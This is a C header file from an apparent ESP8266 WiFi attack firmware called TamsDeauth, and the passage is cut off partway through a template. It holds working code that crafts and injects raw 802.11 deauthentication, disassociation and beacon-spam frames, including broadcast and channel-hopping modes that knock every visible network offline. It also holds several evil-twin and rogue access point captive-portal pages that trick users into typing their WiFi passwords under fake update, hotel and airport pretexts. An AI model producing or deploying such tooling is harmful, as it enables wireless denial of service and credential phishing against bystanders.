#ifndef ATTACKS_H
#define ATTACKS_H

/*
 * TamsDeauth v1.0.0 — attacks.h
 * WiFi Attack Functions for ESP8266 Arduino
 *
 * Attack modes: trueDeauth, preciseDeauth, beaconSpam, deauthAll,
 * etwin1-5, rogue1-5, DDoS Router, Router Guard, deauthmon, sniffer, probe
 *
 * Channel hopping 1-13 (14 supported)
 * ESPNOW_QC remote control protocol
 * BW16 module for 5GHz deauth support
 *
 * State variables defined here are referenced by webserver.h
 * and espnow_ctrl.h:
 *   deauthActive, deauthAllActive, evilTwinActive,
 *   rogueAPActive, passwordsCaptured, scanResultCount
 */

#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <WiFiUdp.h>
#include <WiFiClient.h>
#include <LittleFS.h>
#include "config.h"

// Low-level SDK access for raw 802.11 frame injection
extern "C" {
#include "user_interface.h"
#include <espnow.h>
}

// ============================================================
// Forward declarations from main .ino
// ============================================================
extern ESP8266WebServer server;
extern void hideSoftAP();
extern void showSoftAP();
extern void doReboot();
extern void updateOLED(int line, const char* text);
extern void updateOLEDStatus(const char* status);

// ============================================================
// Constants
// ============================================================

// Evil Twin / Rogue AP template page indices
#define ETWIN_DEFAULT  0
#define ROGUE_DEFAULT  0

// Sniffer sub-modes (int-based for startSniffer(mode))
// Compatible with sniffer.h SnifferMode enum values
enum SnifferMode {
  SNIFF_NONE     = 0,
  SNIFF_ALL      = 1,   // Capture all packets
  SNIFF_PROBE    = 2,   // Capture probe requests only
  SNIFF_DEAUTH   = 3,   // Detect deauth frames (deauthmon)
  SNIFF_STATION  = 4,   // Observe stations on target
};

// 802.11 frame types
#define WLAN_FRAME_TYPE_MGMT    0x00
#define WLAN_FRAME_TYPE_CTRL    0x01
#define WLAN_FRAME_TYPE_DATA    0x02

// Management subtypes
#define WLAN_SUBTYPE_PROBE_REQ    0x04
#define WLAN_SUBTYPE_PROBE_RESP   0x05
#define WLAN_SUBTYPE_BEACON       0x08
#define WLAN_SUBTYPE_DISASSOC     0x0A
#define WLAN_SUBTYPE_DEAUTH       0x0C

// Deauth reason codes
#define SON_CLASS3_FROM_NONASSOC  7
#define SON_DISASSOC_INACTIVITY   4

// Channel range
#define CHANNEL_MIN   1
#define CHANNEL_MAX   14
#define CHANNEL_HOP_INTERVAL_MS  250

// Packet sizes
#define DEAUTH_FRAME_SIZE   26
#define MAX_PKT_BUF         256

// ESP8266 promiscuous rx_ctrl header size (NonOS SDK 2.x/3.x)
#define WIFI_RX_CTRL_SIZE   28

// Limits (MAX_MAC_LIST and MAX_SCAN_RESULTS from config.h)
#define MAX_DEAUTH_LOG      20
#define MAX_BEACON_SSIDS    64

// Broadcast / null MAC
const uint8_t BROADCAST_MAC[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
const uint8_t NULL_MAC[6]      = {0x00,0x00,0x00,0x00,0x00,0x00};

// ============================================================
// 802.11 Frame Structures
// ============================================================

// IEEE 802.11 MAC header (management frame)
struct wifi_mac_hdr_t {
  uint8_t frame_ctrl[2];
  uint8_t duration[2];
  uint8_t addr1[6];   // Destination Address (DA)
  uint8_t addr2[6];   // Source Address (SA)
  uint8_t addr3[6];   // BSSID
  uint8_t seq_ctrl[2];
} __attribute__((packed));

// Deauth / Disassociation frame (MAC header + reason code)
struct wifi_deauth_frame_t {
  struct wifi_mac_hdr_t hdr;
  uint16_t reason_code;
} __attribute__((packed));

// Beacon / Probe Response fixed parameters
struct wifi_beacon_fixed_t {
  uint8_t  timestamp[8];
  uint16_t beacon_interval;
  uint16_t capability_info;
} __attribute__((packed));

// ESP8266 promiscuous-mode packet buffer (rx_ctrl + payload)
struct wifi_promiscuous_pkt_t {
  uint8_t rx_ctrl[WIFI_RX_CTRL_SIZE];
  uint8_t payload[0];
} __attribute__((packed));

// Deauth detection log entry
struct nc_deauth_log {
  uint8_t  src[6];
  uint8_t  dst[6];
  uint8_t  bssid[6];
  uint8_t  channel;
  int16_t  rssi;
  uint32_t timestamp;
};

// Captured credential
struct nc_credential {
  char ssid[33];
  char password[65];
  bool  verified;
  bool  captured;
};

// ============================================================
// Global State Variables
// ============================================================

// --- Scan results (ScanResult defined in config.h) ---
ScanResult scanResults[MAX_SCAN_RESULTS];
int scanResultCount = 0;

// --- Attack state flags (read by webserver.h monitor page) ---
bool deauthActive        = false;
bool deauthAllActive     = false;
bool preciseDeauthActive = false;
bool trueDeauthActive    = false;
bool evilTwinActive      = false;
bool rogueAPActive       = false;
bool beaconSpamActive    = false;
bool ddosActive          = false;
bool routerGuardActive   = false;
bool snifferActive       = false;
bool deauthMonitorActive = false;

// --- Counters ---
int      passwordsCaptured = 0;
uint32_t deauthPacketCount  = 0;
uint32_t beaconSpamCount    = 0;
uint32_t ddosPacketCount    = 0;
uint32_t sniffPktCount      = 0;
uint32_t sniffProbeCount    = 0;
uint32_t sniffBeaconCount   = 0;
uint32_t deauthDetected     = 0;

// --- Beacon spam SSID list ---
String beaconSSIDList;
int    beaconCurrentIndex = 0;

// --- DDoS state ---
WiFiClient ddosClient;
uint32_t lastDdosPacket = 0;

// --- True deauth channel-hop state ---
uint8_t trueDeauthChannel = 1;
uint32_t lastChannelHop   = 0;

// --- Attack timer ---
uint32_t lastAttackTick = 0;

// --- Captive portal state ---
DNSServer dnsServer;
const byte DNS_PORT = 53;
bool dnsServerActive = false;
struct nc_credential capturedCred;
uint8_t currentPortalTemplate = ETWIN_DEFAULT;

// --- Deauth detection log ---
struct nc_deauth_log deauthLog[MAX_DEAUTH_LOG];
int deauthLogIndex = 0;

// --- Router guard station list ---
uint8_t guardStations[MAX_MAC_LIST][6];
int     guardStationCount = 0;

// --- BW16 5GHz module state ---
bool bw16Enabled = false;

// ============================================================
// 802.11 Frame Templates
// ============================================================

// Deauthentication frame (26 bytes)
// FC=0xC0: Management frame, subtype Deauth (type=0x00, subtype=0x0C)
static uint8_t deauthFrameTemplate[26] = {
  0xC0, 0x00,                         // Frame Control: Deauth
  0x00, 0x00,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // addr1: Destination (broadcast)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // addr2: Source (AP MAC)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // addr3: BSSID (AP MAC)
  0x00, 0x00,                         // Sequence Control
  0x07, 0x00                          // Reason: Class 3 frame from nonassoc STA
};

// Disassociation frame (26 bytes)
// FC=0xA0: Management frame, subtype Disassociation (subtype=0x0A)
static uint8_t disassocFrameTemplate[26] = {
  0xA0, 0x00,                         // Frame Control: Disassoc
  0x00, 0x00,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // addr1: Broadcast
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // addr2: Source
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // addr3: BSSID
  0x00, 0x00,                         // Sequence Control
  0x07, 0x00                          // Reason code
};

// Beacon frame template (variable length, up to 128 bytes)
// FC=0x80: Management frame, subtype Beacon (type=0x00, subtype=0x08)
static uint8_t beaconFrameTemplate[128] = {
  0x80, 0x00,                         // Frame Control: Beacon
  0x00, 0x00,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // addr1: Broadcast
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // addr2: Source (random SA)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // addr3: BSSID (same as SA)
  0x00, 0x00, 0x00, 0x00,             // Timestamp (first 4 of 8 bytes)
  0x00, 0x00, 0x00, 0x00,             // Timestamp (last 4)
  0x64, 0x00,                         // Beacon Interval: 100 TU
  0x01, 0x04,                         // Capability Info: ESS
  // SSID IE follows at offset 38
};

// ============================================================
// Helper Functions
// ============================================================

// Check if MAC is broadcast
bool isBroadcastMac(const uint8_t* mac) {
  return memcmp(mac, BROADCAST_MAC, 6) == 0;
}

// Check if MAC is all zeros
bool isNullMac(const uint8_t* mac) {
  return memcmp(mac, NULL_MAC, 6) == 0;
}

// Generate a random locally-administered MAC address
void randomMac(uint8_t* mac) {
  for (int i = 0; i < 6; i++) mac[i] = random(256);
  mac[0] |= 0x02;   // locally administered
  mac[0] &= ~0x01;  // unicast
}

// Print MAC to Serial
void printMac(const uint8_t* mac) {
  for (int i = 0; i < 6; i++) {
    if (i > 0) Serial.print(":");
    if (mac[i] < 0x10) Serial.print("0");
    Serial.print(mac[i], HEX);
  }
}

// ============================================================
// Packet Crafting — Raw 802.11 Frame Building
// ============================================================

// Build a deauth or disassociation frame into buf.
// subtype: WLAN_SUBTYPE_DEAUTH (0x0C) or WLAN_SUBTYPE_DISASSOC (0x0A)
// dst: destination MAC (station or broadcast)
// src: source MAC (AP BSSID)
// bssid: BSSID
// Returns frame length (always 26 bytes).
int buildDeauthFrame(uint8_t* buf, const uint8_t* dst,
                     const uint8_t* src, const uint8_t* bssid,
                     uint8_t subtype, uint16_t reason) {
  buf[0] = (subtype << 4) | 0x00;  // FC: type=mgmt, subtype
  buf[1] = 0x00;                    // flags
  buf[2] = 0x00; buf[3] = 0x00;    // duration
  memcpy(buf + 4,  dst, 6);        // addr1 = DA
  memcpy(buf + 10, src, 6);        // addr2 = SA
  memcpy(buf + 16, bssid, 6);      // addr3 = BSSID
  buf[22] = 0x00; buf[23] = 0x00;  // seq ctrl (system fills if sys_seq=1)
  buf[24] = (reason & 0xFF);
  buf[25] = ((reason >> 8) & 0xFF);
  return DEAUTH_FRAME_SIZE;
}

// Build a beacon frame with a custom SSID into buf.
// Returns total frame length.
int buildBeaconFrame(uint8_t* buf, const char* ssid, uint8_t ssid_len,
                     uint8_t channel, const uint8_t* bssid) {
  int pos = 0;
  buf[pos++] = 0x80; buf[pos++] = 0x00;        // FC: beacon
  buf[pos++] = 0x00; buf[pos++] = 0x00;        // duration
  memcpy(buf + pos, BROADCAST_MAC, 6); pos += 6; // DA = broadcast
  memcpy(buf + pos, bssid, 6); pos += 6;         // SA = spoofed BSSID
  memcpy(buf + pos, bssid, 6); pos += 6;         // BSSID
  buf[pos++] = 0x00; buf[pos++] = 0x00;          // seq ctrl
  // Fixed params
  memset(buf + pos, 0, 8); pos += 8;             // timestamp
  buf[pos++] = 0x64; buf[pos++] = 0x00;          // beacon interval: 100
  buf[pos++] = 0x31; buf[pos++] = 0x04;          // capability: ESS+Privacy
  // Tagged params
  buf[pos++] = 0x00;                             // SSID tag
  buf[pos++] = ssid_len;
  if (ssid_len > 0) {
    memcpy(buf + pos, ssid, ssid_len);
    pos += ssid_len;
  }
  // Supported rates
  buf[pos++] = 0x01; buf[pos++] = 0x04;
  buf[pos++] = 0x82; buf[pos++] = 0x84;
  buf[pos++] = 0x8B; buf[pos++] = 0x96;
  // DS parameter set (channel)
  buf[pos++] = 0x03; buf[pos++] = 0x01;
  buf[pos++] = channel;
  return pos;
}

// Build a probe response frame (type=0x00, subtype=0x05 => FC=0x50)
int buildProbeResponseFrame(uint8_t* buf, const char* ssid, uint8_t ssid_len,
                            uint8_t channel, const uint8_t* dst,
                            const uint8_t* bssid) {
  int pos = 0;
  buf[pos++] = 0x50; buf[pos++] = 0x00;          // FC: probe response
  buf[pos++] = 0x00; buf[pos++] = 0x00;          // duration
  memcpy(buf + pos, dst, 6); pos += 6;            // DA = requesting station
  memcpy(buf + pos, bssid, 6); pos += 6;          // SA = BSSID
  memcpy(buf + pos, bssid, 6); pos += 6;          // BSSID
  buf[pos++] = 0x00; buf[pos++] = 0x00;          // seq ctrl
  memset(buf + pos, 0, 8); pos += 8;             // timestamp
  buf[pos++] = 0x64; buf[pos++] = 0x00;          // beacon interval
  buf[pos++] = 0x31; buf[pos++] = 0x04;          // capability
  buf[pos++] = 0x00; buf[pos++] = ssid_len;       // SSID tag
  if (ssid_len > 0) {
    memcpy(buf + pos, ssid, ssid_len);
    pos += ssid_len;
  }
  buf[pos++] = 0x01; buf[pos++] = 0x04;          // supported rates
  buf[pos++] = 0x82; buf[pos++] = 0x84;
  buf[pos++] = 0x8B; buf[pos++] = 0x96;
  buf[pos++] = 0x03; buf[pos++] = 0x01;          // DS param set
  buf[pos++] = channel;
  return pos;
}

// ============================================================
// Channel Management
// ============================================================

// Hop through channels 1-13 (primarily) for scanning / true deauth / monitor
void hopChannels() {
  trueDeauthChannel++;
  if (trueDeauthChannel > 13) trueDeauthChannel = 1;
  wifi_set_channel(trueDeauthChannel);
  lastChannelHop = millis();
}

// Non-blocking channel hop with interval check
void hopChannelsInterval(uint32_t intervalMs = CHANNEL_HOP_INTERVAL_MS) {
  if (millis() - lastChannelHop > intervalMs) {
    hopChannels();
  }
}

// ============================================================
// Core Frame-Sending Primitives
// ============================================================

// Send a deauth/disassoc frame targeting a specific AP and client.
// If dst is NULL, broadcasts to all stations.
void sendDeauthFrame(const uint8_t* ap_mac, const uint8_t* dst, bool disassoc = false) {
  uint8_t frame[26];
  memcpy(frame, disassoc ? disassocFrameTemplate : deauthFrameTemplate, 26);
  if (dst) memcpy(frame + 4, dst, 6);      // addr1 = destination
  memcpy(frame + 10, ap_mac, 6);            // addr2 = source (AP)
  memcpy(frame + 16, ap_mac, 6);            // addr3 = BSSID
  wifi_send_pkt_freedom(frame, 26, 0);
  deauthPacketCount++;
}

// Send both deauth and disassoc for maximum effect
void sendDeauthBurst(const uint8_t* ap_mac, const uint8_t* dst = NULL) {
  sendDeauthFrame(ap_mac, dst, false);    // deauth (subtype 0x0C)
  sendDeauthFrame(ap_mac, dst, true);     // disassociation (subtype 0x0A)
}

// ============================================================
// 1. Deauth Attack — sendDeauth(target_bssid, channel)
// Build and send 802.11 deauth frames. Includes both deauth and
// disassoc frames. Supports targeted (specific BSSID) and broadcast.
// ============================================================

void sendDeauth(const uint8_t* target_bssid, uint8_t channel) {
  wifi_set_channel(channel);
  delay(1);
  // Broadcast deauth to all stations on this AP
  sendDeauthBurst(target_bssid, NULL);
  // Also deauth the AP itself (DA=bssid, SA=broadcast)
  uint8_t pkt[MAX_PKT_BUF];
  int len = buildDeauthFrame(pkt, target_bssid, BROADCAST_MAC, target_bssid,
                             WLAN_SUBTYPE_DEAUTH, SON_CLASS3_FROM_NONASSOC);
  wifi_send_pkt_freedom(pkt, len, 1);
  deauthPacketCount++;
  delayMicroseconds(100);
  len = buildDeauthFrame(pkt, target_bssid, BROADCAST_MAC, target_bssid,
                         WLAN_SUBTYPE_DISASSOC, SON_DISASSOC_INACTIVITY);
  wifi_send_pkt_freedom(pkt, len, 1);
  deauthPacketCount++;
}

// ============================================================
// 2. Precise Deauth — only deauth specific stations from MAC list
// ============================================================

void sendPreciseDeauth() {
  if (cfg.target_ch == 0) return;
  wifi_set_channel(cfg.target_ch);
  for (int i = 0; i < MAX_MAC_LIST; i++) {
    if (strlen(cfg.mac_list[i]) > 0) {
      uint8_t mac[6];
      if (parseMAC(String(cfg.mac_list[i]), mac)) {
        sendDeauthBurst(cfg.target_bssid, mac);
      }
    }
  }
}

// ============================================================
// 3. True Deauth — real-time deauth, continuously switching channels
// ============================================================

void runTrueDeauth() {
  // Send broadcast deauth for all known APs on current channel
  for (int i = 0; i < scanResultCount; i++) {
    if (scanResults[i].channel == trueDeauthChannel) {
      sendDeauthBurst(scanResults[i].bssid);
    }
  }
  // Hop channels periodically
  hopChannelsInterval(200);
}

// ============================================================
// 4. Deauth All — deauth all visible APs found during scan
// ============================================================

void sendDeauthAll() {
  for (int i = 0; i < scanResultCount; i++) {
    wifi_set_channel(scanResults[i].channel);
    sendDeauthBurst(scanResults[i].bssid);
    delay(5);
  }
}

// ============================================================
// Deauth Attack Start/Stop (called by ESPNOW_QC and webserver)
// ============================================================

void startDeauthAttack() {
  if (cfg.target_bssid[0] == 0 && cfg.target_ch == 0) {
    Serial.println(F("[ATTACK] No target selected"));
    return;
  }
  wifi_set_channel(cfg.target_ch);
  deauthActive = true;
  deauthPacketCount = 0;
  cfg.Attack_Mode = ATTACK_DEAUTH;
  Serial.printf("[ATTACK] Deauth started on %s CH:%u\n",
                cfg.target_ssid, cfg.target_ch);
  updateOLEDStatus("DEAUTH ON");
}

void stopDeauthAttack() {
  deauthActive = false;
  if (cfg.Attack_Mode == ATTACK_DEAUTH) cfg.Attack_Mode = ATTACK_NONE;
  Serial.println(F("[ATTACK] Deauth stopped"));
  updateOLEDStatus("IDLE");
}

void stopDeauth() {
  deauthActive = false;
  preciseDeauthActive = false;
  trueDeauthActive = false;
  if (cfg.Attack_Mode == ATTACK_DEAUTH ||
      cfg.Attack_Mode == ATTACK_PRECISE_DEAUTH ||
      cfg.Attack_Mode == ATTACK_TRUE_DEAUTH)
    cfg.Attack_Mode = ATTACK_NONE;
  Serial.println(F("[ATTACK] All deauth stopped"));
}

// ============================================================
// Deauth All Start/Stop
// ============================================================

void startDeauthAllAttack() {
  deauthAllActive = true;
  deauthPacketCount = 0;
  cfg.Attack_Mode = ATTACK_DEAUTH_ALL;
  Serial.println(F("[ATTACK] Deauth All started"));
  updateOLEDStatus("DEAUTHALL ON");
}

void stopDeauthAllAttack() {
  deauthAllActive = false;
  if (cfg.Attack_Mode == ATTACK_DEAUTH_ALL) cfg.Attack_Mode = ATTACK_NONE;
  Serial.println(F("[ATTACK] Deauth All stopped"));
  updateOLEDStatus("IDLE");
}

// ============================================================
// Precise Deauth Start/Stop
// ============================================================

void startPreciseDeauth() {
  if (cfg.target_ch == 0) {
    Serial.println(F("[ATTACK] No target for precise deauth"));
    return;
  }
  wifi_set_channel(cfg.target_ch);
  preciseDeauthActive = true;
  deauthPacketCount = 0;
  cfg.Attack_Mode = ATTACK_PRECISE_DEAUTH;
  Serial.println(F("[ATTACK] Precise deauth started"));
}

void stopPreciseDeauth() {
  preciseDeauthActive = false;
}

// ============================================================
// True Deauth Start/Stop
// ============================================================

void startTrueDeauth() {
  trueDeauthActive = true;
  trueDeauthChannel = 1;
  deauthPacketCount = 0;
  cfg.Attack_Mode = ATTACK_TRUE_DEAUTH;
  Serial.println(F("[ATTACK] True deauth started (channel-hopping)"));
  updateOLEDStatus("TRUE DEAUTH");
}

void stopTrueDeauth() {
  trueDeauthActive = false;
}

// ============================================================
// 5. Beacon Spam — sendBeaconSpam(ssid_list)
// Craft and broadcast beacon frames with custom SSIDs.
// Supports random SSIDs and user-defined list.
// Reads from /beacons.txt or inline list.
// ============================================================

// Load beacon SSIDs from /beacons.txt in LittleFS
void loadBeaconsFromFile() {
  File f = LittleFS.open("/beacons.txt", "r");
  if (f) {
    beaconSSIDList = f.readString();
    f.close();
  }
}

// Send a single beacon frame with the given SSID
void sendBeacon(const char* ssid) {
  uint8_t frame[128];
  memcpy(frame, beaconFrameTemplate, 38);
  // Random source/BSSID MAC
  for (int i = 10; i < 16; i++) frame[i] = random(256);
  memcpy(frame + 16, frame + 10, 6);  // BSSID = SA
  // SSID Information Element
  uint8_t ssidLen = strlen(ssid);
  if (ssidLen > 32) ssidLen = 32;
  frame[38] = 0x00;            // IE type: SSID
  frame[39] = ssidLen;         // IE length
  memcpy(frame + 40, ssid, ssidLen);
  // DS parameter set IE (channel)
  frame[40 + ssidLen] = 0x03;
  frame[41 + ssidLen] = 0x01;
  frame[42 + ssidLen] = wifi_get_channel();
  int totalLen = 43 + ssidLen;
  wifi_send_pkt_freedom(frame, totalLen, 0);
  beaconSpamCount++;
}

// Send beacon spam for all SSIDs in the list
void sendBeaconSpam(const String& ssid_list) {
  if (ssid_list.length() > 0) beaconSSIDList = ssid_list;
  char delim = beaconSSIDList.indexOf('|') >= 0 ? '|' : '\n';
  int pos = 0;
  while (pos < beaconSSIDList.length()) {
    String ssid = "";
    while (pos < beaconSSIDList.length() && beaconSSIDList[pos] != delim) {
      ssid += beaconSSIDList[pos++];
    }
    pos++;
    ssid.trim();
    if (ssid.length() > 0 && ssid.length() <= 32) {
      sendBeacon(ssid.c_str());
    }
  }
}

void startBeaconSpam() {
  // Load SSID list from /beacons.txt (LittleFS)
  loadBeaconsFromFile();
  if (beaconSSIDList.length() == 0) {
    beaconSSIDList = "Free Wifi|TamsDeauth|Test|Guest|WiFi-5G";
  }
  beaconSpamActive = true;
  beaconSpamCount = 0;
  beaconCurrentIndex = 0;
  cfg.Attack_Mode = ATTACK_BEACON_SPAM;
  Serial.println(F("[ATTACK] Beacon spam started"));
  updateOLEDStatus("BEACON SPAM");
}

void stopBeaconSpam() {
  beaconSpamActive = false;
  if (cfg.Attack_Mode == ATTACK_BEACON_SPAM) cfg.Attack_Mode = ATTACK_NONE;
  Serial.println(F("[ATTACK] Beacon spam stopped"));
  updateOLEDStatus("IDLE");
}

// ============================================================
// Captive Portal HTML Templates (PROGMEM)
// ============================================================

// --- Evil Twin templates (etwin1-5 + default) ---
const char ETWIN_DEFAULT_HTML[] PROGMEM = R"=====(<!DOCTYPE html>
<html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>WiFi Login</title><style>body{font-family:Arial;background:#1a1a2e;color:#eee;margin:0;padding:20px}
.b{max-width:400px;margin:50px auto;background:#16213e;padding:30px;border-radius:10px}
input{width:90%;padding:12px;margin:8px 0;border:1px solid #333;border-radius:5px;background:#0f0f23;color:#fff}
button{width:95%;padding:12px;background:#0e5cc2;color:#fff;border:none;border-radius:5px;cursor:pointer}
h2{color:#7db5ff;text-align:center}</style></head>
<body><div class='b'><h2>WiFi Reconnection Required</h2>
<p>Your session has expired. Please re-enter your WiFi password to reconnect.</p>
<form method='POST' action='/'><input name='password' type='password' placeholder='WiFi Password' required>
<button type='submit'>Reconnect</button></form></div></body></html>)=====";

const char ETWIN_1_HTML[] PROGMEM = R"=====(<!DOCTYPE html>
<html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Router Login</title><style>body{font-family:Arial;margin:0;padding:20px;background:#fff}
.c{max-width:360px;margin:40px auto;text-align:center}
input{width:90%;padding:10px;margin:5px;border:1px solid #ccc;border-radius:4px}
button{width:95%;padding:10px;background:#0066cc;color:#fff;border:none;border-radius:4px}</style></head>
<body><div class='c'><h3>Router Administration</h3>
<p>Firmware update available. Authentication required.</p>
<form method='POST' action='/'><input name='password' type='password' placeholder='Admin Password'>
<button type='submit'>Login</button></form></div></body></html>)=====";

const char ETWIN_2_HTML[] PROGMEM = R"=====(<!DOCTYPE html>
<html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Service Update</title><style>body{font-family:Arial;background:#f5f5f5;margin:0;padding:20px}
.b{max-width:380px;margin:50px auto;background:#fff;padding:25px;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.15)}
input{width:92%;padding:10px;margin:6px 0;border:1px solid #ddd;border-radius:4px}
button{width:97%;padding:10px;background:#4CAF50;color:#fff;border:none;border-radius:4px;font-size:16px}</style></head>
<body><div class='b'><h3>Service Maintenance</h3>
<p>Your internet service requires reconfiguration. Please verify your credentials.</p>
<form method='POST' action='/'><input name='password' type='password' placeholder='WiFi Password' required>
<button type='submit'>Continue</button></form></div></body></html>)=====";

const char ETWIN_3_HTML[] PROGMEM = R"=====(<!DOCTYPE html>
<html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Connect to WiFi</title><style>*{box-sizing:border-box}body{font-family:'Segoe UI',Arial;background:#2c3e50;color:#ecf0f1;margin:0;padding:20px}
.b{max-width:380px;margin:60px auto;background:#34495e;padding:30px;border-radius:12px}
input{width:100%;padding:14px;margin:8px 0;border:none;border-radius:6px;font-size:16px}
button{width:100%;padding:14px;background:#3498db;color:#fff;border:none;border-radius:6px;font-size:16px}</style></head>
<body><div class='b'><h3>Enter WiFi Password</h3>
<form method='POST' action='/'><input name='password' type='password' placeholder='Password' required autofocus>
<button type='submit'>Connect</button></form></div></body></html>)=====";

const char ETWIN_4_HTML[] PROGMEM = R"=====(<!DOCTYPE html>
<html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>System Update</title><style>body{font-family:Arial;background:#000;color:#0f0;margin:0;padding:20px}
.b{max-width:400px;margin:50px auto;border:1px solid #0f0;padding:20px}
input{width:90%;padding:10px;margin:5px;background:#111;color:#0f0;border:1px solid #0f0}
button{width:95%;padding:10px;background:#0f0;color:#000;border:none;cursor:pointer}</style></head>
<body><div class='b'><h3>SYSTEM UPDATE REQUIRED</h3>
<p>Critical security patch. Enter WiFi password to download update.</p>
<form method='POST' action='/'><input name='password' type='password' placeholder='WiFi Password' required>
<button type='submit'>Install Update</button></form></div></body></html>)=====";

const char ETWIN_5_HTML[] PROGMEM = R"=====(<!DOCTYPE html>
<html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Terms of Service</title><style>body{font-family:Arial;background:#fafafa;margin:0;padding:20px}
.b{max-width:420px;margin:40px auto;background:#fff;padding:20px;border:1px solid #e0e0e0;border-radius:6px}
input{width:92%;padding:10px;border:1px solid #ccc;border-radius:4px}
button{width:97%;padding:10px;background:#007bff;color:#fff;border:none;border-radius:4px}</style></head>
<body><div class='b'><h3>Accept Terms of Service</h3>
<p>By using this network you agree to our terms of service.</p>
<form method='POST' action='/'><input name='password' type='password' placeholder='WiFi Password' required>
<button type='submit'>Agree &amp; Connect</button></form></div></body></html>)=====";

// --- Rogue AP templates (rogue1-5 + default) ---
const char ROGUE_DEFAULT_HTML[] PROGMEM = R"=====(<!DOCTYPE html>
<html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Free WiFi</title><style>body{font-family:Arial;background:#1a1a2e;color:#eee;margin:0;padding:20px}
.b{max-width:400px;margin:50px auto;background:#16213e;padding:30px;border-radius:10px}
input{width:90%;padding:12px;margin:8px 0;border:1px solid #333;border-radius:5px;background:#0f0f23;color:#fff}
button{width:95%;padding:12px;background:#e94560;color:#fff;border:none;border-radius:5px;cursor:pointer}
h2{color:#e94560;text-align:center}</style></head>
<body><div class='b'><h2>Welcome to Free WiFi</h2>
<p>Sign in to access the internet.</p>
<form method='POST' action='/'><input name='password' type='password' placeholder='Password' required>
<button type='submit'>Connect</button></form></div></body></html>)=====";

const char ROGUE_1_HTML[] PROGMEM = R"=====(<!DOCTYPE html>
<html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Cafe WiFi</title><style>body{font-family:Georgia,serif;background:#f4e4c1;color:#333;margin:0;padding:20px}
.b{max-width:380px;margin:40px auto;background:#fff;padding:25px;border-radius:8px;border:2px solid #8b4513}
input{width:92%;padding:10px;margin:6px;border:1px solid #ccc;border-radius:4px}
button{width:97%;padding:10px;background:#8b4513;color:#fff;border:none;border-radius:4px}</style></head>
<body><div class='b'><h3>Coffee Shop WiFi</h3>
<p>Enter the WiFi password provided by our staff.</p>
<form method='POST' action='/'><input name='password' type='password' placeholder='WiFi Password' required>
<button type='submit'>Get Connected</button></form></div></body></html>)=====";

const char ROGUE_2_HTML[] PROGMEM = R"=====(<!DOCTYPE html>
<html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Hotel WiFi</title><style>body{font-family:Arial;background:#2c3e50;color:#ecf0f1;margin:0;padding:20px}
.b{max-width:400px;margin:50px auto;background:#34495e;padding:30px;border-radius:10px}
input{width:90%;padding:12px;margin:8px 0;border:none;border-radius:6px;font-size:15px}
button{width:95%;padding:12px;background:#f39c12;color:#fff;border:none;border-radius:6px;cursor:pointer}</style></head>
<body><div class='b'><h3>Hotel Guest WiFi</h3>
<p>Please enter your room password to access the internet.</p>
<form method='POST' action='/'><input name='password' type='password' placeholder='Password' required>
<button type='submit'>Connect to Internet</button></form></div></body></html>)=====";

const char ROGUE_3_HTML[] PROGMEM = R"=====(<!DOCTYPE html>
<html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Airport WiFi</title><style>body{font-family:Arial;background:#003366;color:#fff;margin:0;padding:20px}
.b{max-width:380px;margin:40px auto;background:#004080;padding:25px;border-radius:8px}
input{width:92%;padding:10px;margin:6px;border:1px solid #0066cc;border-radius:4px}
button{width:97%;padding:10px;background:#0099ff;color:#fff;border:none;border-radius:4px}</style></head>
<body><div class='b'><h3>Free Airport WiFi</h3>
<p>Connect to high-speed internet. Enter the access password.</p>
<form method='POST' action='/'><input name='password' type='password' placeholder='Access Password' required>
<button type='submit'>Get Online</button></form></div></body></html>)=====";

const char ROGUE_4_HTML[] PROGMEM = R"=====(<!DOCTYPE html>
<html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>WiFi Setup</title><style>body{font-family:'Courier New',monospace;background:#1e1e1e;color:#d4d4d4;margin:0;padding:20px}
.b{max-width:400px;margin:50px auto;border:1px solid #555;padding:20px}
input{width:90%;padding:10px;margin:5px;background:#2d2d2d;color:#d4d4d4;border:1px solid #555}
button{width:95%;padding:10px;background:#0e5cc2;color:#fff;border:none;cursor:pointer}</style></head>
<body><div class='b'><h3>WiFi Configuration Portal</h3>
<p>[SETUP] Enter network password to configure connection.</p>
<form method='POST' action='/'><input name='password' type='password' placeholder='Enter Password' required>
<button type='submit'>[CONFIGURE]</button></form></div></body></html>)=====";

const char ROGUE_5_HTML[] PROGMEM = R"=====(<!DOCTYPE html>
<html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Internet Access</title><style>body{font-family:Arial;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;margin:0;padding:20px;min-height:90vh}
.b{max-width:400px;margin:50px auto;background:rgba(255,255,255,.15);padding:30px;border-radius:15px}
input{width:90%;padding:12px;margin:8px 0;border:none;border-radius:8px;font-size:15px}
button{width:95%;padding:12px;background:#fff;color:#667eea;border:none;border-radius:8px;font-size:16px}</style></head>
